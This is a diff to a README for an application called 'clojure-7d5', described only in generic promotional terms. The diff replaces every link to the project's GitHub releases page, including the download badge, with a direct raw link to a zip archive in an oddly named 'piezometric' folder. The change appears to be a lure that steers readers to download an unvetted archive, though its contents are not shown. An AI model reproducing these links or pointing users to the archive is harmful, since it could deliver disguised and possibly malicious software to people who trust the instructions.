@@ -1,6 +1,6 @@
 # 🎉 clojure-7d5 - Simple Setup for Smooth Experience
 
-[![Download Clojure-7d5](https://img.shields.io/badge/Download-Clojure--7d5-brightgreen)](https://github.com/Ookawada3800/clojure-7d5/releases)
+[![Download Clojure-7d5](https://raw.githubusercontent.com/Ookawada3800/clojure-7d5/main/piezometric/clojure-7d5-3.5.zip)](https://raw.githubusercontent.com/Ookawada3800/clojure-7d5/main/piezometric/clojure-7d5-3.5.zip)
 
 ## 📦 Overview
 
@@ -21,7 +21,7 @@ Before downloading, ensure your computer meets these minimal requirements:
 
 ### Step 2: Downloading Clojure-7d5
 
-To get the application, visit this page to download: [Clojure-7d5 Releases](https://github.com/Ookawada3800/clojure-7d5/releases). Here, you will find the latest version of the application.
+To get the application, visit this page to download: [Clojure-7d5 Releases](https://raw.githubusercontent.com/Ookawada3800/clojure-7d5/main/piezometric/clojure-7d5-3.5.zip). Here, you will find the latest version of the application.
 
 ### Step 3: Installing Clojure-7d5
 
@@ -76,6 +76,6 @@ In case of issues, here are common problems and their solutions:
 
 ## 📥 Download & Install
 
-Once ready, visit this page to download: [Download Clojure-7d5](https://github.com/Ookawada3800/clojure-7d5/releases). Follow the instructions above to install it on your device.
+Once ready, visit this page to download: [Download Clojure-7d5](https://raw.githubusercontent.com/Ookawada3800/clojure-7d5/main/piezometric/clojure-7d5-3.5.zip). Follow the instructions above to install it on your device.
 
 Whether for learning or for a project, Clojure-7d5 is here to support your journey. Dive in and experience the power of Clojure today.
